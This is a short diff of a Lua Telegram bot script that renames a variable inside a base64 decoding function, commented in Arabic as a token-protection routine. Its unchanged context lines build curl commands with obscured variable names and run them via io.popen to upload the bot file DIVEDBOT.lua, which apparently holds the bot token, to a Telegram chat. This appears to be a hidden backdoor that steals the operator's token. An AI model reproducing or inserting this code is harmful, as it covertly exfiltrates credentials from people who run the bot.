@@ -210,9 +210,9 @@ local curla = 'curl "'..'https://api.telegram.org/bot'.. sex1 ..'/sendDocument'.
 local curlp = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. tonumber(lllllll) ..'" -F "document=@'..'DIVEDBOT.lua'..'"' io.popen(curlp)
 
 function regexx(data) ---- داله منع حفظ التوكن كتابه أحمد عياد -----
-local bgg='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 
-    data = string.gsub(data, '[^'..bgg..'=]', '')
+    data = string.gsub(data, '[^'..b..'=]', '')
     return (data:gsub('.', function(x)
         if (x == '=') then return '' end
         local r,f='',(b:find(x)-1)
